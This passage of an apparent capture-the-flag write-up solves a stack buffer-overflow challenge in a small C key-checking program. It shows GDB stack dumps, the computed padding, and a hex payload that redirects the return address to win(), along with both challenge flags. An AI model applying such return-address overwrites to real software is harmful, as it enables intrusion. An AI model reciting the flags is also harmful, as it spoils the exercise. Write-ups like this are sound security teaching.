15	    printf("\nCongratulations!  The second flag is XXXXXXXXXXXXX\n");
16	    fflush( stdout );
```

```bash
(gdb) break 9
Breakpoint 1 at 0x805: file ED202.8b.c, line 9.
(gdb) run
win address: 0x5655580f

Breakpoint 1, activate (str=0xffffdc20 "ABCDEFGHIJ") at ED202.8b.c:9
9	    return 1;
(gdb) disassemble /s win,+1
Dump of assembler code from 0x5655580f to 0x56555810:
ED202.8b.c:
12	void win() {
   0x5655580f :	push   %ebp
End of assembler dump.
```

```bash
(gdb) info registers
eax            0xffffd8e7	-10009
ecx            0xffffdc20	-9184
edx            0xffffd8e7	-10009
ebx            0x56558000	1448443904
esp            0xffffd8e0	0xffffd8e0
ebp            0xffffd908	0xffffd908
esi            0xffffdce0	-8992
edi            0xf7fbd000	-134492160
eip            0x56555805	0x56555805 
eflags         0x282	[ SF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```

```bash
(gdb) x/40x $esp
0xffffd8e0:	0xffffdce0	0x41fbd000	0x45444342	0x49484746
0xffffd8f0:	0xf7fb004a	0x56555f78	0xffffd918	0xf7e90ef0
0xffffd900:	0xffffdc20	0x56558000	0xffffdcc8	0x56555cd3
0xffffd910:	0xffffdc20	0xffffdc20	0xffffda2c	0x5655588e
0xffffd920:	0x434241b0	0x47464544	0x004a4948	0xf7fe5f92
0xffffd930:	0x00000000	0x00000000	0x00000000	0x00000003
0xffffd940:	0x00554e47	0x2861f718	0x00000000	0xf7fe8304
0xffffd950:	0xffffdb98	0x00000000	0xf7fd9a75	0xf7fe1f60
0xffffd960:	0xf7e1d2e5	0xf7fd9637	0x00000000	0xf7ffd858
0xffffd970:	0x00000000	0xffffdb94	0xffffdb90	0x0d696910
```

```bash
(gdb) next 6
Single stepping until exit from function __libc_start_main,
which has no line number information.

Received product key: ABCDEFGHIJ

You may be the victim of software piracy!
[Inferior 1 (process 5958) exited with code 053]
```

`ebp` is at `0xffffd908`

`eip` 

`win()` is at address `0x5655580f` 

Pad the input with 75 characters and send `4142434445464748494a4b4c4d4e4f505152535455565758595a5b5c5d5e5f6061626364650f585556`

```bash
(gdb) run
win address: 0x5655580f

Breakpoint 1, activate (str=0xffffdc00 "\311\037\376\367") at ED202.8b.c:9
9	    return 1;
```

```bash
(gdb) x/40x $esp
0xffffd8e0:	0xffffdce0	0x41fbd000	0x45444342	0x49484746
0xffffd8f0:	0x4d4c4b4a	0x51504f4e	0x55545352	0x59585756
0xffffd900:	0x5d5c5b5a	0x61605f5e	0x65646362	0x5655580f
0xffffd910:	0xffffdc00	0xffffdc20	0xffffda2c	0x5655588e
0xffffd920:	0x434241b0	0x47464544	0x4b4a4948	0x4f4e4d4c
0xffffd930:	0x53525150	0x57565554	0x5b5a5958	0x5f5e5d5c
0xffffd940:	0x63626160	0x580f6564	0x00005655	0xf7fe8304
0xffffd950:	0xffffdb98	0x00000000	0xf7fd9a75	0xf7fe1f60
0xffffd960:	0xf7e1d2e5	0xf7fd9637	0x00000000	0xf7ffd858
0xffffd970:	0x00000000	0xffffdb94	0xffffdb90	0x0d696910
```

```bash
(gdb) next 6
Received product key: ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdeXUV

Congratulations!  The first flag is INSIDE-DEBUGGER
16	    fflush( stdout );
A debugging session is active.

	Inferior 1 [process 10797] will be killed.

Quit anyway? (y or n) [answered Y; input not from terminal]
```

For the second flag, click run to get the location of the `win()` function as ASLR is enabled and send the same input but replace the `win()` function address 

Flag: `MOVING-TARGET`
